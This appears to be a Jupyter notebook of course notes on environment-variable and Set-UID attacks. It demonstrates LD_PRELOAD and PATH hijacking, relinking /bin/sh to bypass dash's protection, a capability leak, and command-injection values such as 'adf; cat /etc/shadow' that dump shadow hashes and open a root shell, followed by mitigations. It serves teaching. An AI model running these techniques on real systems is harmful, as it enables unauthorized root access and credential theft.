# Environment Variables and SetUID Programs: Attacks and Mitigations

## Environment Variables Pitfalls
- there's no known inherent vulnerability on environment variables
- like many features of OSes, they just provide a convenient way to manage configuration settings

### Security Risks
- env vars are accessible by processes on the system; means that sensitive information stored in them such as API keys or database credentials could potentially be exposed if proper security measures not in place

### Accidental Overwriting
- since env vars are dynamic and can be changed at runtime, there's a risk of accidental overwriting
- a misconfigured or malicious process might alter the values of critical variables, leading to unexpected behavior of applications

### Debugging Challenges
- in complex systems, tracing the source of a problem can be difficult

### Dependency on External Configuration
- overreliance on environment variables for configuration settings can make it challenging to manage and version configurations, esp. in larger projects
- changes in configruations may require updates in multiple places, leading to potentital inconsistencies

### Lack of Encryption
- environment variables are typically stored in plaintext
- sensitive information if stored as env vars can be exposed

### Limited Access Control
- access control on env variables are ususally limited
- it can be challenging to ensure proper access control to preven unauthorized access and modification to sensitive variables

### Hard-Coding Pitfall
- care should be taken to access the hard-coded env vars in programs
- what if the values of the variables are modified by the malicios programs and processes?

## Vulnerabilities due to Environment Variables

### Linker/Loader

- Linker is a special program used to find the external library functions used by a program
- usually out of developers controls
- Linker in most OSes use env variables to find where the libraries are
- provides opporunity for malicious users to link "malicious" libraries and code


### Library

- most programs invoke api functions from external libraries
- the external libraries may not have been developed for privileged programs
    - may not santize the values of the environment variables
    
### External program

- a program may invoke external program(s) for certain functionalities
    - sending emails, printing, reading network data, etc.
- when the program is invoked, its code may run with the calling process's privilege
- the external program may in turn use env variables expanding the attack surface and increasing the risks

### Application code

- a program may implicitly use environment variables in its code
- developers may have misunderstanding and wrong assumptions of how environment variables get passed into the program
- these assumptions may lead into using unsanitized env variables leading to vulnerable code

### Attacks via Dynamic Linker

- before the program executes, **linker** program links the code with the system's libraries
- linking can be done in two places: statically and dynamically
- let's look into each type of linking

#### Static Linking
- links the program code and librariy code into a single binary without relying on the external library code
- the executable is self-contained
    - it has everything it needs in the same program file
    
- we can specify `-static` option in **gcc** and **g++** compilers for static linking
- program file becomes huge (many magnitudes bigger compared to dynamic linking)
- takes more memory to load the whole program into RAM
- if the library has bug/security holes, your application program will be shipped with the bugs and holes

#### Dynamic Linking

- link the external libraries during program execution
- by default compilers perform dynamic linking
- program files are much smaller
- many program share the same **shared** library loaded by OS
    - in `*nix` systems, these files are `.so` extension (Shared Object)
    - in Windows, these files are called DLLs (Dynamic link libraries)
- we can use `ldd` command to see what shared libraries a program depends on
- in `*nix` systems, ELF (Executable and Linkable File) contains `.interp` section that specifies the name of the linker
    - the linker itself is a shared library (`ld-linux.so`, `ld.so`)
- let's see a `hello.cpp` program to demonstrate the differences


```python
%pwd
```


```python
# change cwd if needed
%cd ../demos/envvars
```


```python
! cat hello.cpp
```


```python
# compile with static linking
! g++ -static -o hello_static.exe hello.cpp
```


```python
# Note the size of the binary
! ls -al hello_static.exe
```


```python
! ./hello_static.exe
```


```python
# let's see what ldd program says
! ldd hello_static.exe
```


```python
# compile for dynamic linking
! g++ -o hello_dynamic.exe hello.cpp
```


```python
# let's see the size
! ls -al hello_dynamic.exe
```


```python
! ./hello_dynamic.exe
```


```python
! ldd hello_dynamic.exe
```

## Dynamic Linking Exploitation

- missing code is decided during run-time
- missing libraries are search in default path provided by ENV variables such as **LD_PRELOAD**, **LD_LIBRARY_PATH**
- these variable are not set by default
- however, they can be set and exported so the programs can use them
- since we can't set ENV variables from Jupyter Notebooks, we'll use a Terminal
- the demo programs used are: `demos/envvars/dynamic_vuln.cpp` and `demos/envvars/mysleep.c`
- dynamic library must be written in C not in C++


```python
! printenv PATH
```


```python
# let's see LD_PRELOAD varialbe
! printenv LD_PRELOAD
```


```python
# let's see LD_LIBRARY_PATH
! printenv LD_LIBRARY_PATH
```


```python
! ls
```


```python
! cat dynamic_vuln.cpp
```


```python
! g++ -o dynamic_vuln.exe dynamic_vuln.cpp
```


```python
! ./dynamic_vuln.exe
```


```python
! ldd dynamic_vuln.exe
```


```python
! cat mysleep.c
```


```python
# let's just compile into object code and not build it as an executable
# creates sleep.o file
! gcc -c mysleep.c
```


```python
# let's check the file
! ls -al mysleep.o
```


```python
# create a shared library from mysleep.o object file
! gcc -shared -o mysleeplib.1.0.0.so mysleep.o
```


```python
! ls -al mysleeplib.1.0.0.so
```

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ export LD_LIBRARY_PATH=$PWD            
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ export LD_PRELOAD=./mysleeplib.1.0.0.so
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ ./dynamic_vuln
I'm sleeping for 2 seconds.
Sorry I'm not sleeping...
I'm awake now...                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ ldd dynamic_vuln
        linux-vdso.so.1 (0x00007ffff9bf7000)
        ./mysleeplib.1.0.0.so (0x00007fa30c0d9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa30bedd000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa30c0e5000)
```

### Set-UID Programs - Exercise

- verify that the above attack will NOT work for Set-UID programs
- do research on why it won't work

## PATH Environment Variable Vulnerabilty

- if your program uses system calls to an external program that relies on PATH variable to lookup its path, it is vulnerable!
- `today.cpp` program in `demos/envexploit` folder uses `system` API to rely on PATH variable to call date function
- can we force this program to read `/etc/passwd` file without modifying the program itself?


```python
! pwd
```


```python
# change cwd if needed
%cd ../envexploit
```


```python
! ls -al
```


```python
! cat today.cpp
```


```python
! cat  Makefile
```


```python
! make
```


```python
! ls -al
```


```python
! ./today
```


```python
! which date
```

## Exploitation of PATH env variable

- today program uses `system` API to call `date` program
- system finds `date` program by search the `PATH` env variable which is in `/usr/bin/date`
- create your own "date" program; that does whatever you want it to do
- update the PATH so it finds your "date" program before finding system's `/usr/bin/date`
- you can write your program in whatever language of your choice
    - bash script is the easiest in this case
- see `date` script in the `demo/envexploit` folder
- make the program executable
- update the PATH from Terminal and run the today program


```python
! pwd
```


```python
! cat date
```


```python
! chmod +x date
```


```python
! ls -al date
```


```python
! ./date
```

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ export PATH=$PWD:$PATH 
                                                                                                     
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ echo $PATH            
/home/kali/projects/SoftwareSecurity/demos/envexploit:/home/kali:/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali//home/kali/bin

(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ ./today
Today is: root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh
bob:x:1001:1001:,,,:/home/bob:/bin/bash
Woohoo I got it!
```

## Direct Usage of Env Vars in Application Code

- if ENV variables are accessed and used as part of the application code, it may be vulnerable
- let's see `demos/envvars/print_pwd.cpp` do demo the vulnerability and its exploitation
- the program prints current working directory, similar to `pwd` program


```python
! pwd
```


```python
# change cwd if needed
%cd ../demos/envvars
```


```python
! cat print_pwd.cpp
```


```python
! g++ -o print_pwd.exe print_pwd.cpp
```


```python
! ./print_pwd.exe
```

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ pwd
/home/kali/projects/SoftwareSecurity/demos/envvars
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ echo $PWD                              
/home/kali/projects/SoftwareSecurity/demos/envvars
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]
└─$ cd ..                                  
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]
└─$ echo $PWD     
/home/kali/projects/SoftwareSecurity/demos

(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]
└─$ ./envvars/print_pwd
Current working directory is: /home/kali/projects/SoftwareSecurity/demos
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]
└─$ PWD=abc               
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]
└─$ ./envvars/print_pwd
Current working directory is: abc
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]
└─$ export PWD="Whatever you wish..."      
                                                                                                                
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]
└─$ ./envvars/print_pwd
Current working directory is: Whatever you wish...
```

## Exploitation of Set-UID Programs

- the impact of the exploitation of set-uid programs can be severe
- can compromise all 3 CIA triads
    - what are CIA triads?

![Set-UID Exploitation](./media/setuid-attacks.png)

### Exploitation Via User Inputs

#### Buffer Overflow Vulnerability
- covered in depth later in Bufffer Overflow chapters
- overflow a buffer to run arbitrary malicious code

#### Format String Vulnerability
- covered in depth later in Format String chapter
- change program behavior using user inputs for format strings

### Exploitation via System Inputs
- covered in Race Condition chapter

### Exploitation via Environment Variables
- if the program (e.g., today program) is set-uid, you can exploit it to execute any program as the owner of the program
- if the program is root, anyone who can run this program gains root's privileges during its execution
    - esentially, it typically escalates users' privileges and that can have serious consequences
- `system(command)` is a wrapper for `/bin/sh`
    - it is invoked as `/bin/sh -c command`
    - i.e., it invokes `/bin/sh` and and asks the shell to execute the command
- `system()` passes the env vars of calling process to the new program `/bin/sh`
- in newer version of Linux (Ubuntu 20.04 and Kali 2023, e.g.), `/bin/sh` is actually a symbolic link pointing to `/bin/dash`
- `/bin/dash` has a conutermeasure that prevents itself from being executed in a Set-UID process
    - if dash detects that it is being executed in a Set-UID prorcess, it immediately changes the effective User ID to the process's real ID -- essentially dropping the privilege
- if we update the `date` script and try to read priviledged `/etc/shadow` file, it'll fail!
- we can however update the softlink  `/bin/sh` to point to `/bin/zsh` which doesn't have the countermeasure
- let's use `demos/envexploit/today.cpp` file to demostrate the vulnerability and exploitation


```python
! pwd
```


```python
%cd ../envexploit
```


```python
! ls -al /bin/sh
```


```python
# if needed, do the following 
# let's create a soft link /bin/sh pointing to /bin/dash
# this is the default
! echo kali | sudo -S ln -sf /bin/dash /bin/sh
```


```python
! g++ -o today today.cpp
```


```python
! echo kali | sudo -S chown root today
```


```python
! ls -al
```


```python
! echo kali | sudo -S chmod +s today
```


```python
! ls -al
```


```python
! cat date 
```

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ ./today
Today is: cat: /etc/shadow: Permission denied
Command failed :(
```


```python
# let's create a soft link /bin/sh pointing to /bin/zsh
! echo kali | sudo -S ln -sf /bin/zsh /bin/sh
```


```python
! ls -al /bin/sh
```

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]
└─$ ./today
Today is: root:!:19662:0:99999:7:::
...
kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::
bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7:::
Woohoo I got it!
```

## Capability Leaking Vulnerability

- in some cases, privileged programs downgrade themselves during execution
- E.g., **su** program

### su
- su is a privileged set-uid program
- allows user to switch to another user (say user1 to user2)
- program starts with EUID as root and RUID as user1
- after password verification, both EUID and RUID becomes user2's (via privilege downgrading)
- such programs may lead to capability leaking if not implemented correctly
    - programs may not clean up privileged capabilities before downgrading

### Exploiting Capability Leak
- let's look at an example program provided in `demos/capleak/` folder
- program opens a file in `/etc` in **write/append** mode
- program must be root setuid to be able to write to the `/etc` folder
- program downgrades the privilege with the RUID of the user
- it then executes `/bin/sh`
- conviniently, file descriptor value is also printed
- run the program from the Terminal to get the shell 
- it's guaranted that the file description will be a lower integer greater than 2
    - 0: used for stdin
    - 1: used for stdout
    - 2: used for stderr


```python
! pwd
```


```python
%cd ../demos/capleak
```


```python
! ls -al
```


```python
! cat capleak.cpp
```

    // https://github.com/seed-labs/seed-labs/blob/master/category-software/Environment_Variable_and_SetUID/Labsetup/cap_leak.c
    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <fcntl.h>
    
    using namespace std;
    
    int main(int argc, char *argv[])
    {
        int fd;
        char *v[2];
    
        fd = open("/etc/xyz", O_RDWR | O_APPEND | O_CREAT);
        if (fd == -1)
        {
            printf("Failed to open /etc/xyz\n");
            exit(1);
        }
        // print out the file descriptor value
        printf("fd is %d\n", fd);
        // FIXME - close the file descriptor
        // downgrade the privilege mb making the effective uid the same as the real uid
        setuid(getuid());
        // execute /bin/sh using execve
        v[0] = "/bin/sh";
        v[1] = 0;
        execve(v[0], v, 0);
        return 0;
    }



```python
! echo kali | sudo -S make
```

    g++ -g -Wall -std=c++17 capleak.cpp -o capleak.exe
    [01m[Kcapleak.cpp:[m[K In function ‘[01m[Kint main(int, char**)[m[K’:
    [01m[Kcapleak.cpp:26:12:[m[K [01;35m[Kwarning: [m[KISO C++ forbids converting a string constant to ‘[01m[Kchar*[m[K’ [[01;35m[K-Wwrite-strings[m[K]
       26 |     v[0] = [01;35m[K"/bin/sh"[m[K;
          |            [01;35m[K^~~~~~~~~[m[K
    sudo chown root capleak.exe
    sudo chmod +s capleak.exe



```python
! ls -al
```

    total 48
    drwxrwxrwx+  2 codespace root  4096 Feb 10 20:15 .
    drwxrwxrwx+ 22 codespace root  4096 Jan  3 00:55 ..
    -rw-rw-rw-   1 codespace root   420 Feb 10 20:10 Makefile
    -rw-rw-rw-   1 codespace root   769 Feb 10 18:29 capleak.cpp
    -rwsrwsrwx   1 root      root 22640 Feb 10 20:10 capleak.exe
    -rw-rw-rw-   1 codespace root    10 Feb 10 20:15 est.txt
    -rw-rw-rw-   1 codespace root    10 Feb 10 20:15 test.txt


```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/capleak]
└─$ ./capleak 
fout is 3
$ echo ABCDEF                                                                                              
ABCDEF
$ echo ABCDEF >& 3                                                                                       
$ cat /etc/xyz                                                                                             
aaa
aaaa
ABCDEF
$ exit
```

## Fix the Vulnerability

- close/destroy the file description before dropping the privelege

## Capbility Leaking in OS X - Case Study

- OS X Yosemite found vulnerable to privilege escalation attack related to capability leaking in July 2015 ( OS X 10.10 )
- added features to dynamic linker dyld 
    - DYLD_PRINT_TO_FILE environment variable
- the dynamic linker can open any file, so for root-owned Set-UID programs, it runs with root privileges 
- the dynamic linker dyld, does not close the file leading to capability leaking vulnerability


## Command Injection Vulnerability

- programs' often takes input from users
- if the users' input is not validated and sanitized, data can be converted into command name
    - data is then executed as command
- SQL injection is a type of command injection attack very common in SQL-driven web applications
- see `catall.cpp` file in `demos/injection` folder


```python
! pwd
```

    /workspaces/SoftwareSecurity/demos/capleak



```python
%cd ../injection
```

    /workspaces/SoftwareSecurity/demos/injection



```python
! ls -al
```

    total 40
    drwxrwxrwx+  3 codespace root  4096 Jan  3 00:09 .
    drwxrwxrwx+ 22 codespace root  4096 Jan  3 00:55 ..
    -rw-rw-rw-   1 codespace root   433 Jan  3 00:09 Makefile
    -rwxrwxrwx   1 codespace root 20368 Jan  3 00:09 catall
    -rw-rw-rw-   1 codespace root   522 Jan  3 00:09 catall.cpp
    drwxrwxrwx+  2 codespace root  4096 Jan  3 00:09 secure



```python
! cat catall.cpp
```

    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    int main(int argc, char *argv[])
    {
        char *v[3];
        char program[] = "/bin/cat";
        char *command;
        if (argc < 2)
        {
            printf("Usage: catall <file_path>.\n");
            exit(EXIT_FAILURE);
        }
        v[0] = program; v[1] = argv[1]; v[2] = NULL;
        command = (char *)malloc(strlen(v[0]) + strlen(v[1]) + 2);
        sprintf(command, "%s %s", v[0], v[1]);
        //printf("argv[1] = %s\n", argv[1]);
        system(command);
    
        return 0;
    }


```python
! echo kali | sudo -S make
```

    g++ -g -Wall -std=c++17 catall.cpp -o catall
    sudo chown root catall
    sudo chmod +s catall


- you must use the "quotations" around the commands ";" separated arguments
- quotes ensure everything is passed as a single argument to the vulnurable program
- note, injecting /bin/zsh gives root but injecting  /bin/sh doesn not 

```bash
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]
└─$ ./catall "adf; cat /etc/shadow"
/bin/cat: adf: No such file or directory
root:!:19662:0:99999:7:::
...
kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::
bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7::

(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]
└─$ ./catall "adf; /bin/bash"
/bin/cat: adf: No such file or directory
bash-5.2$ whoami
kali
bash-5.2$ ./catall "asdf; /bin/bash"
/bin/cat: asdf: No such file or directory
bash-5.2$ exit
exit
bash-5.2$ exit
exit
                                                                                                                                                                                                                                                                                         
(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]
└─$ ./catall "adf; /bin/zsh" 
/bin/cat: adf: No such file or directory
x86_64-conda-linux-gnu# whoami
root
x86_64-conda-linux-gnu# id
uid=1000(kali) gid=1000(kali) euid=0(root) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),105(netdev),117(wireshark),120(bluetooth),133(scanner),140(kaboxer)
x86_64-conda-linux-gnu# 
```

## Mitigation

- avoid `system` call if possible
- use `execve` properly instead of `system` when executing system commands from C/C++ programs
- `execve` allows you to separate the command from the input data
- `exec` family of function is lower-level compared to system and allows for granular control on how the program should be executed
- allows you to pass your own environment variables in the third argument
- replaces the current process image with a new one, executing the specified program
- you need to provide full path to the executable and explictly pass an array of arguments
    - preventing the ENV VARS overriding exploitation 
- not all `exec` family funcions behave similarly
    - `execlp(), execvp(), execvpe()` duplicate the actions of the shell
    - these functions can be attacked using the PATH Environment Variable
    
```bash
execve(command_name, input_data_argument, env_variables);
```

- patch the `catall.cpp` program and try to exploit it again
- see `demos/injection/secure` folder for the secure version of `cat_all` program
- compile and try the command injection again...


```python
! man execve
```

```bash
(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]
└─$ ./secure_catall "adfasdf; ls -al"
/bin/cat: 'adfasdf; ls -al': No such file or directory
  
  
(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]
└─$ ./secure_catall "adfasdf; /bin/cat /etc/passwd"
/bin/cat: 'adfasdf; /bin/cat /etc/passwd': No such file or directory
```

## Invoking External Commands in Other Languages

- risks of invoking external commands or command injection is not limited to C/C++ programs
- goal is to avoid problems similar to those caused by the system() function
- many languages allow system API, such as PHP, Perl, Python, etc.

## Mitigating Attacks on SetUID Programs and Env Variables

### Sanitize Untrusted Data

- take extra precution on using untrested data
- always sanitize user/untrusted data before using them in the application

### Use Secure API Functions and Library

- use `secure_getenv()` instead of `getenv()`

### Use Principle of Isolation
    
- don't mix code with data
- various vulnerabilities such as system() code execution, XSS (Cross-site scripting), SQL Injection, Buffer Overflows are consequences of mixing code with data

### Use Principle of Least Privilege

- a privileged program should be given the just the right amount of power required to perform its tasks
- disable the privileges (temporarily or permenanently) when a privileged program doesn't need those
- in Linux, seteuid() and setuid() can be used to downgrade/upgrade privilege when needed
    - different OSes may provide different APIs
    
### Use Principle of Cleanup After

- discard the resources after they're done being used
- free/release memory used by dynamic variables created using **new**, **malloc**, etc.
- close files and resources after their usages



```python

```
